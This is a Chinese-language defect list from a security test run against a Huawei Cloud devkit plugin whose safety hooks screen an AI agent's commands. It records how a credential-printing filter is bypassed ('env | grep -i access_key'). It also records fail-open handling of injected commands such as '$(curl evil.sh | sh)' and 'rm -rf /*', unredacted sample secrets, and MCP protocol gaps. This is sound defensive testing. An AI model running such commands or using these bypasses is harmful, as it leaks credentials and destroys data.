# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-10-14-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-14 05:21（北京时间）
> **被测版本**：huaweicloud-devkit v1.1.8（gitHead 74f519dc）
> **本清单是统一提单脚本 file_issue.py 的解析输入**。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整（泛化 access_key 穿透）

- **现象**：`env | grep -i access_key` 返回 `decision=allow risk=not_huaweicloud`（未拦截）；`env | grep HW_ACCESS_KEY` / `HUAWEICLOUD_SDK_AK` / `HCLOUD_AK` 均 deny
- **断言**：`env | grep -i access_key` 应 `deny`
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:517-520` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只覆盖华为云前缀，未覆盖无前缀的泛化敏感变量名 `access_key`/`secret_key`
- **影响**：攻击者用无前缀泛化词 `grep -i access_key` 可绕过凭证环境变量打印拦截，泄漏 AK/SK
- **证据**：`evidence/D4-2/stdout.log`
- **状态**：待提单

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL actions=[*] 与 AdministratorFullAccess

- **现象**：JSON 形态 broad IAM `{"Effect":"Allow","Action":"*","Resource":"*"}` 判 deny；但 Terraform HCL `resource "huaweicloud_iam_policy" ... actions=["*"]` 与 `data "huaweicloud_iam_policy" ... name="AdministratorFullAccess"` 均 `decision=allow`
- **断言**：HCL `actions=["*"]` 与 `AdministratorFullAccess` 应 deny
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196` hwc-iam-admin-policy 规则只匹配 JSON 形态 Effect/Action，缺 Terraform HCL 语法与 `AdministratorFullAccess` 后缀匹配
- **影响**：IaC 制品预检漏拦 HCL 形态的越权 IAM 策略，可静默授予管理员权限
- **证据**：`evidence/D4-21/stdout.txt`（含 hcl-probe 补充）
- **状态**：待提单

## #3【P0】D9-12 initialize 不触发版本检查 + 非法时序 tools/list 未拒

- **现象**：`initialize` 阶段 runVersionCheck 未调用（`runVersionCheck in init=false`，已下沉 prewarm/check_cli）；`tools/list` 在未 `initialize` 时仍返回 42 工具（未拒 -32600）
- **断言**：initialize 应触发版本检查；非法时序 tools/list 应拒 `-32600`
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:183-187` initialize 逻辑未调 runVersionCheck，dispatch 无 initialize 前置校验
- **影响**：MCP 协议握手安全基线不满足，非法时序调用未被拒绝（协议健壮性）
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：待提单

## #4【P1】D4-6 adminPass 空格/JSON 形态未脱敏且 hook 不告警

- **现象**：源码级 `adminPass=xxx→<redacted>` 通过；但 `--admin_pass MyPwd123`（空格 flag 形态）与 `{"server":{"adminPass":"MyPwd123"}}`（camelCase JSON 字符串）未脱敏，hook_check_command 无告警
- **断言**：adminPass 空格形态 + camelCase JSON 形态均应脱敏/告警
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:41` redactString 敏感 key 正则 `/admin[_-]?pass\s*[:=]/` 仅覆盖 `:`/`=` 分隔，未覆盖 `--flag value` 空格形态与 camelCase `adminPass`
- **影响**：部署密码在 flag 形态/JSON 形态下明文回显到 agent 上下文
- **证据**：`evidence/D4-6/stdout.txt`
- **状态**：待提单

## #5【P1】D4-17 安全 hook 模糊输入 fail-open

- **现象**：`command=""`、`"   "`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"` 均 `结论=ok`（fail-open，未 deny）
- **断言**：空/模糊/注入命令应 fail-closed（deny）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1161-1162` `hookResult(evaluateCommandRisk(args.command||''))`，空输入/无匹配回退 allow，未走 `risk-rule-engine.mjs:121-133` 的 invalidRiskResult fail-closed
- **影响**：畸形/注入命令被放行，安全 hook 失效（fail-open）
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：待提单

## #6【P1】D3-S7 跨服务交付复合意图未命中部署目标 + RDS 创建失败

- **现象**：复合意图仅命中 `RDS`（部署目标命中=false）；`RDS CreateInstance` 返回 `Invalid parameter: db.password`（缺 vpc/subnet/sg 前置未在 plan 补齐）
- **断言**：复合意图应命中 RDS + 部署目标；RDS 最小实例创建成功
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1983` serviceCatalog 部署目标路由缺失 + RDS 编排前置参数（vpc/subnet/sg）缺失
- **影响**：跨服务交付（Web 应用 + RDS）场景无法端到端落地
- **证据**：`evidence/D3-S7/stdout.txt`
- **状态**：待提单

## #7【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中 ECS

- **现象**：`"帮我查一下我账号在华北北京四有哪些云主机"` → MISS（实际=Run hcloud --help）；评测集 15 条 HIT=13 MISS=1 N/A=1（准确率 92.9%）
- **断言**：中文意图「云主机」应命中 ECS 查询
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1983` serviceCatalog 中文词表缺「云主机」→ ECS 映射
- **影响**：中文「云主机」查询场景路由失效
- **证据**：`evidence/EXP-E01/stdout.txt`
- **状态**：待提单

## #8【P1】D9-9 capabilities.cancellation 未声明（SPEC 契约漂移）

- **现象**：`initialize` 返回 `capabilities={"tools":{}}`，未声明 cancellation；取消后 tools/list 工具数不变（无取消能力）
- **断言**：取消能力按 capabilities 实测（不存在→SPEC-MISMATCH 标注）
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs` initialize 返回 capabilities 未含 cancellation
- **影响**：MCP 协议取消能力缺失（契约漂移，待裁决）
- **证据**：`evidence/D9-9/stdout.txt`
- **状态**：待提单

## #9【P2】D3-S5 复合意图分层路由未命中多 service

- **现象**：`serviceCatalog("存储 + 静态托管")` 回退 `skills=["Use huaweicloud-core to route intent."]`、`services=["Run hcloud --help ..."]`，多路命中=false
- **断言**：复合意图（存储+托管）应命中多个 service（OBS + 部署目标）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1983` serviceCatalog 复合意图拆分未多路返回
- **影响**：复合意图路由降级为 --help 兜底，能力发现失效
- **证据**：`evidence/D3-S5/stdout.txt`
- **状态**：待提单

## #10【P2】D3-S6 FunctionGraph CreateFunction 缺 code.filename/code.zip_file 参数

- **现象**：`run CreateFunction -> ok=true stdout=[USE_ERROR]Invalid parameter: code.filename`，URN 空、定时触发器未绑定
- **断言**：CreateFunction 返回 URN + 定时触发器绑定成功
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph 编排创建命令缺少有效 `code.zip_file`（真实 zip base64）+ `code.filename`（zip 内入口文件）参数
- **影响**：FunctionGraph 定时任务场景无法落地
- **证据**：`evidence/D3-S6/stdout.txt`
- **状态**：待提单

## #11【P2】D4-25 Python hook 写操作遥测误分类 cli:invoke

- **现象**：`hcloud vpc CreateVpc` 遥测记 `cli:invoke`（应为 `cli:write`）
- **断言**：写操作应记 `cli:write`
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:112` `event_key = "cli:read" if is_read else ("cli:write" if is_write else "cli:invoke")`，is_write 判定不完整
- **影响**：Python hook 遥测分类失真，写操作无法按 cli:write 统计审计
- **证据**：`evidence/D4-25/stdout.txt`
- **状态**：待提单

## #12【P2】D4-26 findings.evidence 明文 secret_key/adminPass 残留

- **现象**：`findings.evidence="tf/main.tf {"access_key":"AKIA***","secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345",...}"`，leaked=true
- **断言**：findings.evidence 应脱敏，无明文 AK/SK/password
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1643` `findings: result.findings` 未过 redactSecrets
- **影响**：安全工单证据字段明文泄漏密钥（access_key 部分脱敏但 secret_key/adminPass 未脱敏）
- **证据**：`evidence/D4-26/stdout.txt`
- **状态**：待提单

## #13【P2】D8-9 sanitizeValue 未移除 AK/SK/token 敏感值（SPEC 契约漂移）

- **现象**：`sanitize(AK=...)=\"AK=ABC123DEF456GHI\"`、`sanitize(access_key/token=...)=...` 均保留明文（仅去控制字符+截断）
- **断言**：sanitizeValue 应移除 AK/SK/token 敏感值与非法字符
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 缺敏感值替换逻辑
- **影响**：遥测值脱敏契约不满足，AK/SK/token 可能进入遥测
- **证据**：`evidence/D8-9/stdout.txt`
- **状态**：待提单

## #14【测试侧】D10-4 规则库 16→19 条断言契约漂移（改用例，非产品缺陷）

- **现象**：规则库 19 条（9 deny + 10 warn），用例断言 16 条（9 deny + 7 warn）；高危/只读/删除/secret 判定均正确
- **断言**：规则库 16 条（9 deny + 7 warn）——断言随版本陈旧
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则数增至 19 条（非安全回归，产品增强）
- **说明**：改用例断言为「规则数 ≥16 且高危/只读/删除/secret 判定正确」，不计入产品缺陷提单